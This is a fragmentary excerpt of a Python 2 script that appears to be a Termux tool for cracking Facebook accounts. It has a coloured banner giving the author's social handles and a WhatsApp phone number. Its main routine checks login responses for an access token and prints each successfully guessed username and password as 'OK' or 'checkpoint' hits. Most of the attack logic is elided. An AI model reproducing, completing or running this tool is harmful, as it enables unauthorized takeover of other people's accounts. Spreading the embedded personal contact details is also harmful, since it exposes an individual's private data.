...
\033[1;35m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
       ...
       \033[1;32mFACEBOOK \033[1;34mMEHEDI HASAN TONU 

       \033[1;33mAUTHOR \033[1;32mBD-TERMUX

       \033[1;34mGITHUB \033[1;35mTONU-143

       \033[1;36mWHATSAPP \033[1;33m+8801759916221

\033[1;32m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇

""")

print("\033[0;91mThis Tool's By TONU")
...
def menu():
    ...
    print '\033[0;93mAUTHOR   : BD-TERMUX'

    print '\033[0;94mFACEBOOK : MEHEDI HASAN TONU'

    print '\033[0;96mGITHUB   : TONU-143'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;92m[TONU-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                ...
                print '\x1b[1;92m [TONU-OK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
